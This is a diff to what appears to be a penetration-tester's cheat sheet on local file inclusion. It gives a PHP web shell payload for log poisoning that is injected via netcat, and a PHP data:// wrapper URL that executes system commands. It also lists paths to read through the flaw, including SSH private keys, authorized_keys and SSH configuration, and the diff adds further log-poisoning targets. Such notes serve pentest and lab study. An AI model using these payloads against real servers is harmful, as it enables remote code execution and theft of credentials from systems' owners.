@@ -35,6 +35,10 @@ c:\Windows\System32\Drivers\etc\hosts
 	1. nc -nv <ip> 22
 	2. Payload: Thisislogpoisoning/<?php passthru($_GET['cmd']); ?>
 
+	#Other Log poisoning
+	1. Proc Self Environ: https://www.exploit-db.com/papers/12886
+	2. FreeBSD: /var/log/httpd-access.log | /var/log/httpd-error.log
+
 #PHP Wrappers
 	#Data Wrapper - Code Execution!
 	1. http://example.com/file.php?file=data://text/plain,<%3fphp%2520echo%2520system('uname+-a')%3b%3f>
@@ -47,12 +51,10 @@ c:\Windows\System32\Drivers\etc\hosts
 ```
 #What can we read that would be useful?
 #SSH KEYS!
-	#Home
-	1. /home/<user>/.ssh/id_rsa | /home/<user>/.ssh/id_rsa.keystore | /home/<user>/.ssh/id_rsa.pub /home/<user>/.ssh/authorized_keys | /home/<user>/.ssh/known_hosts
+	#Home (Check /etc/passwd first for usernames.)
+	1. /home/<user>/ + .ssh/id_rsa | .ssh/id_rsa.keystore | .ssh/id_rsa.pub | .ssh/authorized_keys | .ssh/known_hosts | .ssh/config
 	#Configuration
-	2. 
-	3.
+	2. /etc/ssh/ssh_config
 
-#HASHES!
 
 ```
